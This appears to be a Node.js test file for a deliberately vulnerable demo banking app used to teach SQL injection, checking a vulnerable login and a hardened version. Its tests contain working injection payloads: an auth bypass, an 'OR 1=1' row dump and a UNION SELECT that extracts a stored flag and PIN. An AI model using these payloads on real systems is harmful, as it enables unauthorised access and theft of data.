const assert = require('assert');
const { EventEmitter } = require('events');

function mockReq(method, body, url) {
  const req = new EventEmitter();
  req.method = method;
  req.url = url || '/';
  req.headers = {};
  req.destroy = () => {};
  process.nextTick(() => { if (body) req.emit('data', body); req.emit('end'); });
  return req;
}
function mockRes() {
  return {
    statusCode: 200, headers: {}, body: null,
    setHeader(k, v) { this.headers[k] = v; },
    end(b) { this.body = b ? JSON.parse(b) : null; }
  };
}
async function call(handler, method, body, url) {
  const req = mockReq(method, body, url);
  const res = mockRes();
  await handler(req, res);
  return res;
}

(async () => {
  const login = require('../api/login.js');
  const loginSafe = require('../api/login-safe.js');
  const statement = require('../api/statement.js');
  const pin = require('../api/pin.js');

  // 1. wrong creds rejected
  let r = await call(login, 'POST', 'username=admin&password=wrong');
  assert.strictEqual(r.statusCode, 401); assert.strictEqual(r.body.ok, false);

  // 2. real creds work
  r = await call(login, 'POST', 'username=admin&password=' + encodeURIComponent('s3cure!Vault#99'));
  assert.strictEqual(r.statusCode, 200); assert.strictEqual(r.body.user.role, 'ADMIN');

  // 3. THE DEMO: injection bypasses auth, server-side
  r = await call(login, 'POST', 'username=' + encodeURIComponent("' OR '1'='1' -- ") + '&password=x');
  assert.strictEqual(r.statusCode, 200);
  assert.strictEqual(r.body.user.username, 'admin');
  assert.ok(r.body.query.includes("OR '1'='1'"), 'echoes injected query');

  // 4. unbalanced quote -> real SQL error (error-based feedback)
  r = await call(login, 'POST', "username='&password=x");
  assert.strictEqual(r.statusCode, 500);
  assert.ok(/SQLite error/.test(r.body.error));

  // 5. hardened endpoint: same payload fails
  r = await call(loginSafe, 'POST', 'username=' + encodeURIComponent("' OR '1'='1' -- ") + '&password=x');
  assert.strictEqual(r.statusCode, 401);
  r = await call(loginSafe, 'POST', 'username=admin&password=' + encodeURIComponent('s3cure!Vault#99'));
  assert.strictEqual(r.statusCode, 200);

  // 6. statement: normal
  r = await call(statement, 'GET', null, '/api/statement?account=2');
  assert.strictEqual(r.statusCode, 200); assert.ok(r.body.rows.length >= 2);

  // 7. numeric injection dumps everything
  r = await call(statement, 'GET', null, '/api/statement?account=' + encodeURIComponent('2 OR 1=1'));
  assert.ok(r.body.rows.length >= 4);

  // 8. UNION extraction steals the flag + PIN
  r = await call(statement, 'GET', null, '/api/statement?account=' + encodeURIComponent('-1 UNION SELECT id, code, note, 0 FROM vault_secrets'));
  assert.strictEqual(r.statusCode, 200);
  const flat = JSON.stringify(r.body.rows);
  assert.ok(flat.includes('FLAG{sql1_1s_4ll_1_n33d}'), 'flag stolen via UNION');
  assert.ok(flat.includes('VAULT-COMBO-7319'), 'PIN leaked via UNION');

  // 9. UNION with wrong column count -> SQL error (teaching moment)
  r = await call(statement, 'GET', null, '/api/statement?account=' + encodeURIComponent('-1 UNION SELECT 1,2 FROM vault_secrets'));
  assert.strictEqual(r.statusCode, 500);

  // 10. PIN endpoint
  r = await call(pin, 'POST', 'pin=0000');
  assert.strictEqual(r.statusCode, 401);
  r = await call(pin, 'POST', 'pin=7319');
  assert.strictEqual(r.statusCode, 200);
  assert.ok(r.body.flag.includes('FLAG{1ntrud3r'));

  console.log('api tests: all pass');
})().catch((e) => { console.error('FAIL:', e.message); process.exit(1); });
